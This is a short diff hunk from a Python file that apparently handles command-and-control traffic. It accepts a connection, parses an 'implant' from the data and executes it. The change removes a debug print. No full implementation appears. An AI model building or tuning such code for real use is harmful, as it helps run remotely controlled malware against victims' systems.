@@ -42,5 +42,4 @@ def execute_cnc(implant):
 
 data = accept_connection()
 implant = parse_cnc(data)
-print(implant)
 execute_cnc(implant)
